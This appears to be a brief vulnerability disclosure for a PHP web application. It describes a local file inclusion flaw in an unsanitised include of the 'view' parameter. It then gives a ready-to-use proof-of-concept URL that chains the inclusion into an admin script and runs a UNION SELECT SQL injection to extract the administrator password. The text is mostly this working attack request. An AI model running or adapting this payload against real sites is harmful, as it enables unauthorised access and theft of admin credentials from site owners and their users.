include SOURCES . $filename;

So you can include a fil by doing ; http://[site]/index.php?view=[file]


By using the LFI, you can also include "admin files" which are especially unsecure, and let you inject SQL queries.

As the file admin/sources/edit_loginad.php


PoC ; http://[site]/index.php?view=../admin/Sources/edit_loginad&edit=-1%20union%20select%201,2,3,4,%28SELECT%20password%20FROM%20admin%29,6,7,8,9--%20-
